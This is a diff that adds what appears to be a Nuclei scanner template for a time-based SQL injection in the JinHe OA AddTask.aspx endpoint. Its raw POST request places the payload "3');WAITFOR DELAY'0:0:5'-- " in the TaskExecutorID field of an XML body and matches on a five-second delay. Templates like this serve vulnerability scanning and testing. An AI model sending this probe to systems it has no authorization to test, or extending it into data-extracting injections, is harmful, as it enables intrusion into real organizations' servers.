@@ -1,0 +1,35 @@
+id: JinHeOA-AddTask-sqlInjection
+
+info:
+  name: JinHeOA-AddTask-sqlInjection
+  author: iSee857
+  severity: high
+  description: JinHeOA-AddTask-sqlInjection
+
+requests:
+  - method: POST
+    raw:
+      - |
+        POST /c6/Jhsoft.Web.dailytaskmanage/AddTask.aspx/ HTTP/1.1
+        Host: {{Host}}
+        Content-type:application/xml
+
+        <root>
+         <Page>
+          <PageName>TaskDetect</PageName>
+         </Page>
+         <StartTime>2025-06-06 00:00:00</StartTime>
+         <EndTime>2025-06-06 00:00:00</EndTime>
+         <TaskExecutorID>3');WAITFOR DELAY'0:0:5'-- </TaskExecutorID>
+        </root>
+
+      
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+      - type: status
+        status:
+          - 200
